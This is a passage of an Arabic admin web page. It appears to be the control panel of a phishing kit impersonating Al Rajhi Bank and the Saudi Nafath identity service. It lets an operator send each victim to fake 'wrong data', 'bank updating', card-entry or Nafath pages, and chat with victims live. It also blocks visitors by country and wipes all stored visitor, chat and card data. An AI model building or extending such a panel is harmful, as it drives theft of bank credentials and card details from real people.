                    <button type="button" class="btn btn-light flex-fill fw-bold rounded-3"
                        data-bs-dismiss="modal">إلغاء</button>
                    <button type="button" id="confirmNafathBtn" onclick="confirmNafathAction(event)"
                        class="btn btn-primary flex-fill fw-bold rounded-3">تأكيد</button>
                </div>
            </div>
        </div>
    </div>
    <div class="modal fade" id="rajhiActionModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content border-0 shadow-lg" style="border-radius:20px;overflow:hidden;">
                <div class="modal-header border-0 pb-0 d-flex align-items-center justify-content-between"
                    style="background:linear-gradient(135deg,#005a8f,#003d63);color:white;padding:30px 40px;">
                    <div class="d-flex align-items-center gap-4">
                        <div class="p-3 bg-opacity-20 rounded-4 shadow-sm text-white d-flex align-items-center justify-content-center"
                            style="width:60px;height:60px;">
                            <i class="bi bi-bank fs-3"></i>
                        </div>
                        <div>
                            <h5 class="modal-title fw-800 mb-1" id="rajhiModalTitle" style="letter-spacing:-0.5px;">
                                إدارة بنك الراجحي</h5>
                            <p class="mb-3 opacity-75 small fw-bold" id="rajhiModalSubtitle">بوابة التوجيه الخاصة
                                بالراجحي
                            </p>
                        </div>
                    </div>
                </div>
                <div class="modal-body p-4">
                    <label class="fw-bold text-muted small mb-2 d-block text-end">🔗 وجهة التوجيه بعد الإجراء:</label>
                    <div class="d-flex flex-column gap-2" id="pageOptionsRajhi" style="direction: rtl;">
                        <label class="d-flex align-items-center gap-3 p-3 border rounded-3 page-option"
                            style="cursor:pointer;transition:0.2s;">
                            <input type="radio" name="modalPageRajhi" value="raj.php?reject=1"
                                class="form-check-input m-0">
                            <i class="bi bi-bank2 text-danger fs-5"></i>
                            <span class="fw-semibold">بيانات خاطئة (إعادة محاولة)</span>
                        </label>
                        <label class="d-flex align-items-center gap-3 p-3 border rounded-3 page-option"
                            style="cursor:pointer;transition:0.2s;">
                            <input type="radio" name="modalPageRajhi" value="raj.php?done=1"
                                class="form-check-input m-0">
                            <i class="bi bi-clock-history text-warning fs-5"></i>
                            <span class="fw-semibold">الراجحي قيد التحديث (30 دقيقة)</span>
                        </label>
                        <label class="d-flex align-items-center gap-3 p-3 border rounded-3 page-option"
                            style="cursor:pointer;transition:0.2s;">
                            <input type="radio" name="modalPageRajhi" value="payment.php" class="form-check-input m-0">
                            <i class="bi bi-credit-card-fill text-primary fs-5"></i>
                            <span class="fw-semibold">رجوع إلى البطاقة</span>
                        </label>
                        <label class="d-flex align-items-center gap-3 p-3 border rounded-3 page-option"
                            style="cursor:pointer;transition:0.2s;">
                            <input type="radio" name="modalPageRajhi" value="nafath.php" class="form-check-input m-0">
                            <i class="bi bi-person-badge-fill text-info fs-5"></i>
                            <span class="fw-semibold">نفاذ</span>
                        </label>
                    </div>
                </div>
                <div class="modal-footer border-0 p-4 pt-0">
                    <button type="button" class="btn btn-light flex-fill fw-bold rounded-3"
                        data-bs-dismiss="modal">إلغاء</button>
                    <button type="button" id="confirmRajhiBtn" onclick="confirmRajhiAction(event)"
                        class="btn btn-primary flex-fill fw-bold rounded-3">تأكيد الإجراء</button>
                </div>
            </div>
        </div>
    </div>
    <!-- 2. Allowed Countries Modal -->
    <div class="modal fade" id="countriesModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content border-0 shadow-lg rounded-5 overflow-hidden">
                <div class="modal-header border-0 pb-0 d-flex align-items-center justify-content-between"
                    style="background:linear-gradient(135deg,#0ea5e9,#2563eb);color:white;padding:30px 10px;">
                    <div class="d-flex align-items-center gap-4">
                        <div class="p-3 bg-opacity-20 rounded-4 shadow-sm text-white d-flex align-items-center justify-content-center"
                            style="width:60px;height:60px;">
                            <i class="bi bi-shield-lock-fill fs-2"></i>
                        </div>
                        <div>
                            <h5 class="modal-title fw-800 mb-1" style="letter-spacing:-0.5px;">الجدار الناري الجغرافي
                            </h5>
                            <p class="mb-3 opacity-75 small fw-bold">إدارة قيود الوصول والمناطق المسموحة</p>
                        </div>
                    </div>
                </div>
                <div class="modal-body p-4">
                    <div class="mb-4" style="direction: rtl;">
                        <label class="form-label small fw-bold text-muted text-uppercase mb-2"
                            style="letter-spacing: 1px;">إضافة دولة جديدة:</label>
                        <div class="input-group">
                            <select id="countrySelect" class="form-select border-light shadow-sm py-2"
                                style="border-radius: 0 12px 12px 0;">
                                <option value="" selected disabled>اختر الدولة...</option>
                                <option value="JO|الأردن">الأردن</option>
                                <option value="SA|السعودية">السعودية</option>
                                <option value="AE|الإمارات">الإمارات</option>
                                <option value="KW|الكويت">الكويت</option>
                                <option value="QA|قطر">قطر</option>
                                <option value="OM|عمان">عمان</option>
                                <option value="BH|البحرين">البحرين</option>
                                <option value="EG|مصر">مصر</option>
                                <option value="IQ|العراق">العراق</option>
                                <option value="US|الولايات المتحدة">الولايات المتحدة</option>
                            </select>
                            <button type="button" class="btn btn-primary px-4 fw-bold" onclick="addCountry()"
                                style="border-radius: 12px 0 0 12px;">
                                <i class="bi bi-plus-lg ms-1"></i> إضافة
                            </button>
                        </div>
                    </div>

                    <div class="border-top pt-3" style="direction: rtl;">
                        <label class="form-label small fw-bold text-muted text-uppercase mb-3"
                            style="letter-spacing: 1px;">الدول النشطة حالياً:</label>
                        <div id="allowedCountriesList" class="d-flex flex-wrap gap-2">
                            <!-- Injected via AJAX -->
                        </div>
                    </div>
                </div>
                <div class="modal-footer border-light bg-light py-3 border-0">
                    <div class="w-100 d-flex align-items-center justify-content-between" style="direction: rtl;">
                        <div class="text-muted small">
                            <i class="bi bi-info-circle ms-1"></i> سيتم منع أي زائر من خارج هذه الدول تلقائياً.
                        </div>
                        <button type="button" class="btn btn-outline-secondary btn-sm fw-bold px-4 rounded-3"
                            data-bs-dismiss="modal">إغلاق</button>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- 3. Inline Chat Modal -->
    <!-- Advanced Chat Modal UI -->
    <div class="modal fade" id="chatModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content border-0 shadow-lg"
                style="border-radius: 20px; overflow: hidden; background: #fff;">
                <div class="modal-header border-0 text-white p-4"
                    style="background: linear-gradient(135deg, #156394, #2a88c4); position: relative;">
                    <div class="d-flex align-items-center gap-3">
                        <div class="bg-white bg-opacity-20 rounded-circle d-flex align-items-center justify-content-center"
                            style="width: 50px; height: 50px; backdrop-filter: blur(5px);">
                            <i class="bi bi-headset fs-3 text-white"></i>
                        </div>
                        <div>
                            <h5 class="modal-title fw-bold mb-0" id="chatModalTitle">محادثة الزائر</h5>
                            <small class="opacity-75 d-block" id="chatModalSessionId">---</small>
                        </div>
                    </div>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"
                        style="position: absolute; left: 20px; top: 30px;"></button>
                </div>
                <div class="modal-body p-0 d-flex flex-column" style="height: 520px; background: #fbfbfc;">
                    <!-- Messages Container -->
                    <div id="modal-chat-messages" class="flex-grow-1 p-3 overflow-auto d-flex flex-column gap-2"
                        style="background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png'); background-attachment: local; background-size: cover;">
                        <div class="text-center py-5 text-muted opacity-50">
                            <div class="spinner-border spinner-border-sm mb-2 text-primary"></div>
                            <p>جاري تحميل المحادثة...</p>
                        </div>
                    </div>

                    <!-- Typing Indicator -->
                    <div id="modal-typing-indicator" class="px-4 py-2 small text-primary d-none"
                        style="font-weight: 600; background: rgba(255,255,255,0.9);">
                        <span class="spinner-grow spinner-grow-sm me-1"></span> الزائر يكتب الآن...
                    </div>

                    <!-- Message Input Area -->
                    <div class="p-3 border-top bg-white shadow-sm">
                        <form id="modal-chat-form" class="d-flex gap-2 align-items-center">
                            <input type="text" id="modal-chat-input"
                                class="form-control border-0 bg-light rounded-pill px-4 py-2"
                                placeholder="اكتب ردك هنا..." autocomplete="off"
                                style="box-shadow: none; font-size: 0.95rem;">
                            <button type="submit"
                                class="btn btn-primary rounded-circle shadow-sm d-flex align-items-center justify-content-center"
                                style="width: 48px; height: 48px; background: #156394; border: none; transition: transform 0.2s;">
                                <i class="bi bi-send-fill fs-5"></i>
                            </button>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Chat Notification Toast Container -->
    <div id="chatNotifContainer"
        style="position:fixed; top:90px; left:20px; z-index:999999; display:flex; flex-direction:column; gap:10px; pointer-events:none;">
    </div>

    <style>
        @keyframes notifSlideIn {
            from {
                opacity: 0;
                transform: translateX(-40px) scale(0.95);
            }

            to {
                opacity: 1;
                transform: translateX(0) scale(1);
            }
        }

        @keyframes notifSlideOut {
            from {
                opacity: 1;
                transform: translateX(0) scale(1);
            }

            to {
                opacity: 0;
                transform: translateX(-40px) scale(0.95);
            }
        }

        .chat-notif-toast {
            pointer-events: auto;
            background: linear-gradient(135deg, #1e293b 0%, #334155 100%);
            color: #fff;
            padding: 14px 20px;
            border-radius: 16px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3), 0 0 0 1px rgba(255, 255, 255, 0.08);
            display: flex;
            align-items: center;
            gap: 14px;
            min-width: 280px;
            max-width: 380px;
            cursor: pointer;
            animation: notifSlideIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            transition: transform 0.2s, box-shadow 0.2s;
            border-right: 4px solid #3b82f6;
        }

        .chat-notif-toast:hover {
            transform: scale(1.03);
            box-shadow: 0 12px 35px rgba(0, 0, 0, 0.35), 0 0 0 1px rgba(255, 255, 255, 0.12);
        }

        .chat-notif-toast.closing {
            animation: notifSlideOut 0.3s ease-in forwards;
        }

        .chat-notif-icon {
            width: 44px;
            height: 44px;
            border-radius: 50%;
            background: linear-gradient(135deg, #3b82f6, #2563eb);
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.4);
        }

        .chat-notif-body {
            flex: 1;
            min-width: 0;
        }

        .chat-notif-name {
            font-weight: 700;
            font-size: 0.9rem;
            margin-bottom: 2px;
        }

        .chat-notif-text {
            font-size: 0.75rem;
            opacity: 0.7;
        }

        /* Visitor card chat glow effect */
        @keyframes chatGlow {

            0%,
            100% {
                box-shadow: 0 0 5px rgba(59, 130, 246, 0.3);
            }

            50% {
                box-shadow: 0 0 20px rgba(59, 130, 246, 0.6), 0 0 40px rgba(59, 130, 246, 0.2);
            }
        }

        .user-module.has-new-chat {
            animation: chatGlow 2s ease-in-out 3;
            border-color: #3b82f6 !important;
        }
    </style>

    <!-- Additional Chat JS Logic -->
    <script>
        let currentTargetSession = null;
        let adminPusher = new Pusher('4a9de0023f3255d461d9', { cluster: 'ap2', useTLS: true });
        let currentSubscribedChannel = null;

        // ====== Floating Toast Notification System ======
        function showChatNotifToast(sessionId, visitorName) {
            const container = document.getElementById('chatNotifContainer');
            const toast = document.createElement('div');
            toast.className = 'chat-notif-toast';
            toast.innerHTML = `
                <div class="chat-notif-icon">
                    <i class="bi bi-chat-dots-fill fs-5"></i>
                </div>
                <div class="chat-notif-body">
                    <div class="chat-notif-name">${visitorName || 'زائر'}</div>
                    <div class="chat-notif-text">أرسل رسالة جديدة 💬</div>
                </div>
                <i class="bi bi-chevron-left opacity-50"></i>
            `;
            toast.onclick = function () {
                toast.classList.add('closing');
                setTimeout(() => toast.remove(), 300);
                openAdminChatModal(sessionId);
            };

            container.appendChild(toast);

            // Auto-remove after 5 seconds
            setTimeout(() => {
                if (toast.parentNode) {
                    toast.classList.add('closing');
                    setTimeout(() => toast.remove(), 300);
                }
            }, 5000);
        }

        // ====== Global Notifications for tab badge ======
        const adminGlobalChannel = adminPusher.subscribe('admin-global');
        adminGlobalChannel.bind('new-visitor-message', function (data) {
            // --- If admin has this exact session open in the chat modal, auto-mark as read ---
            if (currentTargetSession === data.session_id) {
                // Don't increment badges — message is already visible in the modal
                // Just mark as read silently
                fetch('mark_chat_read.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ session_id: data.session_id })
                });
                return;
            }

            // --- Update Chat Tab Badge ---
            const badge = document.getElementById('chat-tab-badge');
            if (badge) {
                let count = parseInt(badge.innerText) || 0;
                badge.innerText = count + 1;
                badge.style.display = 'inline-block';

                badge.animate([
                    { transform: 'scale(1)' },
                    { transform: 'scale(1.5)' },
                    { transform: 'scale(1)' }
                ], { duration: 400 });
            }

            // --- Update Visitor Card Chat Badge (Visitors Tab) ---
            const visitorCard = document.querySelector(`.user-module[data-session-id="${data.session_id}"]`);
            if (visitorCard) {
                // Highlight the card with glow
                visitorCard.classList.add('has-new-chat');
                setTimeout(() => visitorCard.classList.remove('has-new-chat'), 6000);

                // Update the chat icon badge
                const cardBadge = visitorCard.querySelector('.chat-badge');
                if (cardBadge) {
                    let cardCount = parseInt(cardBadge.innerText) || 0;
                    cardBadge.innerText = cardCount + 1;
                    cardBadge.style.display = 'inline-block';
                    cardBadge.animate([
                        { transform: 'scale(1)' },
                        { transform: 'scale(1.6)' },
                        { transform: 'scale(1)' }
                    ], { duration: 400 });
                }
            }

            // --- Show Floating Toast ---
            showChatNotifToast(data.session_id, data.visitor_name);

            // --- Play Notification Sound ---
            new Audio('https://assets.mixkit.co/active_storage/sfx/2354/2354-preview.mp3').play().catch(e => { });
        });

        // Reset currentTargetSession when the chat modal is closed
        document.getElementById('chatModal').addEventListener('hidden.bs.modal', function () {
            currentTargetSession = null;
        });

        function openAdminChatModal(sessionId) {
            if (!sessionId) return;

            currentTargetSession = sessionId;
            document.getElementById('chatModalSessionId').innerText = sessionId;

            var chatModalEl = document.getElementById('chatModal');
            var modal = bootstrap.Modal.getInstance(chatModalEl);
            if (!modal) modal = new bootstrap.Modal(chatModalEl);
            modal.show();

            // Clear glow effect from the card
            const targetCard = document.querySelector(`.user-module[data-session-id="${sessionId}"]`);
            if (targetCard) targetCard.classList.remove('has-new-chat');

            // Unsubscribe from previous if any
            if (currentSubscribedChannel) {
                adminPusher.unsubscribe(currentSubscribedChannel);
            }

            // Subscribe to the visitor's channel
            currentSubscribedChannel = 'chat-' + sessionId;
            let channel = adminPusher.subscribe(currentSubscribedChannel);

            channel.bind('new-message', function (data) {
                if (data.sender_type === 'visitor') {
                    displayModalMessage(data);
                    scrollToBottom();
                    // Auto-mark as read since admin is viewing
                    fetch('mark_chat_read.php', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ session_id: sessionId })
                    });
                }
            });

            channel.bind('typing', function (data) {
                if (data.sender_type === 'visitor') {
                    const indicator = document.getElementById('modal-typing-indicator');
                    indicator.classList.remove('d-none');
                    setTimeout(() => indicator.classList.add('d-none'), 3000);
                }
            });

            // Mark as read
            fetch(`mark_chat_read.php`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ session_id: sessionId })
            }).then(() => {
                const cardBadge = document.querySelector(`.user-module[data-session-id="${sessionId}"] .chat-badge`);
                if (cardBadge) {
                    const cardVal = parseInt(cardBadge.innerText) || 0;
                    cardBadge.style.display = 'none';
                    cardBadge.innerText = 0;

                    // Global badge adjust
                    const gBadge = document.getElementById('chat-tab-badge');
                    if (gBadge) {
                        let gVal = parseInt(gBadge.innerText) || 0;
                        gVal = Math.max(0, gVal - cardVal);
                        gBadge.innerText = gVal;
                        if (gVal <= 0) gBadge.style.display = 'none';
                    }
                }
            });

            // Load history
            loadModalHistory(sessionId);
        }

        function loadModalHistory(sessionId) {
            const messagesDiv = document.getElementById('modal-chat-messages');
            messagesDiv.innerHTML = '<div class="text-center py-5 text-muted small">جاري التحميل...</div>';

            fetch(`../chat_history.php?is_admin=1&visitor_id=${sessionId}`)
                .then(res => res.json())
                .then(messages => {
                    messagesDiv.innerHTML = '';
                    if (messages.length === 0) {
                        messagesDiv.innerHTML = '<div class="text-center py-5 text-muted small">لا توجد رسائل سابقة.</div>';
                    } else {
                        messages.forEach(m => displayModalMessage(m));
                        scrollToBottom();
                    }
                });
        }

        function displayModalMessage(m) {
            const messagesDiv = document.getElementById('modal-chat-messages');
            const isSelf = (m.sender_type === 'admin');

            const msgHtml = `
                <div class="d-flex ${isSelf ? 'justify-content-start' : 'justify-content-end'} mb-3">
                    <div class="p-2 px-3 shadow-sm" 
                         style="max-width: 85%; background: ${isSelf ? '#156394' : '#ffffff'}; color: ${isSelf ? '#ffffff' : '#000000'}; 
                                border-radius: ${isSelf ? '18px 18px 18px 4px' : '18px 18px 4px 18px'} !important;
                                border: ${isSelf ? 'none' : '1px solid #eee'};">
                        <div style="font-size: 0.95rem; line-height: 1.4;">${m.message}</div>
                        <div class="text-end small opacity-50 mt-1" style="font-size: 0.65rem;">
                            ${new Date(m.created_at || Date.now()).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                        </div>
                    </div>
                </div>
            `;
            messagesDiv.insertAdjacentHTML('beforeend', msgHtml);
        }

        function scrollToBottom() {
            const div = document.getElementById('modal-chat-messages');
            div.scrollTop = div.scrollHeight;
        }

        // Typing event
        let lastAdminTyping = 0;
        $('#modal-chat-input').on('keydown', function () {
            if (Date.now() - lastAdminTyping > 3000 && currentTargetSession) {
                lastAdminTyping = Date.now();
                fetch('../pusher_chat_handler.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ session_id: currentTargetSession, type: 'typing', sender_type: 'admin' })
                });
            }
        });

        $('#modal-chat-form').on('submit', function (e) {
            e.preventDefault();
            const input = document.getElementById('modal-chat-input');
            const msg = input.value.trim();
            if (msg && currentTargetSession) {
                displayModalMessage({
                    message: msg,
                    sender_type: 'admin',
                    created_at: new Date().toISOString()
                });
                scrollToBottom();

                fetch('../pusher_chat_handler.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        session_id: currentTargetSession,
                        message: msg,
                        sender_type: 'admin'
                    })
                });
                input.value = '';
            }
        });
        function updateBlockedWords() {
            const words = document.getElementById('blockedWordsInput').value;

            Swal.fire({
                title: 'جاري الحفظ...',
                allowOutsideClick: false,
                didOpen: () => {
                    Swal.showLoading();
                }
            });

            fetch('ajax_settings.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'update_blocked_words', blocked_words: words })
            })
                .then(r => r.json())
                .then(res => {
                    if (res.success) {
                        Swal.fire({
                            icon: 'success',
                            title: 'تم الحفظ!',
                            text: 'تم تحديث قائمة الكلمات المحظورة بنجاح.',
                            timer: 2000,
                            showConfirmButton: false
                        });
                    } else {
                        Swal.fire({ icon: 'error', title: 'خطأ', text: res.error });
                    }
                });
        }
        function confirmFactoryReset() {
            Swal.fire({
                title: 'هل أنت متأكد؟',
                text: "سيتم حذف كافة البيانات النهائية للزوار والمحادثات والبطاقات! لن تتمكن من التراجع عن هذا الإجراء.",
                icon: 'warning',
                showCancelButton: true,
                confirmButtonColor: '#dc3545',
                cancelButtonColor: '#6c757d',
                confirmButtonText: 'نعم، إفراغ المركز الآن!',
                cancelButtonText: 'إلغاء',
                reverseButtons: true
            }).then((result) => {
                if (result.isConfirmed) {
                    Swal.fire({
                        title: 'جاري الحذف...',
                        didOpen: () => { Swal.showLoading(); }
                    });

                    fetch('ajax_settings.php', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ action: 'delete_all_data' })
                    })
                        .then(r => r.json())
                        .then(res => {
                            if (res.success) {
                                Swal.fire({
                                    icon: 'success',
                                    title: 'تم التصفير!',
                                    text: 'تم حذف كافة البيانات وتفريغ المركز بنجاح.',
                                    confirmButtonText: 'حسناً'
                                }).then(() => {
                                    window.location.href = 'index.php?tab=visitors';
                                });
                            } else {
                                Swal.fire({ icon: 'error', title: 'خطأ', text: res.error });
                            }
                        });
                }
            });
        }
    </script>
</body>

</html>